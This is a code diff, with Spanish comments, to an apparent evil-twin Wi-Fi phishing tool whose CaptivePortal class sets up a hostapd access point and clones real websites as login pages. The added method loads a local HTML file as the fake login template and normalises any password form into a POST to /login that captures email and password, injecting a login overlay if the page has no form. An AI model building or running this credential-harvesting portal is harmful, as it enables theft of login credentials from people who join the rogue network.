@@ -856,6 +856,44 @@ class CaptivePortal:
             self._err("No se pudo clonar la plantilla.")
             return False
 
+    def load_custom_html_file(self, path):
+        """
+        Carga un HTML propio desde disco (en lugar de clonar una URL) y lo
+        usa como plantilla de login. Alternativa a clone_template() cuando
+        el pipeline de clonado no da buen resultado contra una web real.
+
+        El HTML se pasa por _adapt_form() igual que una plantilla clonada:
+        si trae un <form> con un input password, se normaliza a POST /login
+        con campos email/password; si no trae ningún form, se le inyecta
+        el overlay de login por defecto. Así el fichero funciona tal cual
+        lo tengas, sin tener que tocarle los nombres de los campos a mano.
+
+        Retorna True si tuvo éxito, False si falló (fichero no encontrado,
+        vacío, o error de lectura/parseo).
+        """
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                raw_html = f.read()
+        except Exception as e:
+            self._err("No se pudo leer el archivo: " + str(e))
+            return False
+
+        if not raw_html.strip():
+            self._err("El archivo HTML está vacío: " + path)
+            return False
+
+        self._log("[*] Cargando HTML propio desde: " + path)
+        try:
+            html = _adapt_form(raw_html, self._log)
+        except Exception as e:
+            self._err("Error adaptando el HTML cargado: " + str(e))
+            return False
+
+        self.custom_html = html
+        self.template_type = "custom"
+        self._log("[+] Plantilla local cargada OK (" + str(len(html)) + " bytes)")
+        return True
+
     def _write_hostapd_conf(self):
         hw = self._hw_mode(self.channel)
         conf = ("interface=" + self.interface + "\ndriver=nl80211\nssid=" + self.ssid + "\n"
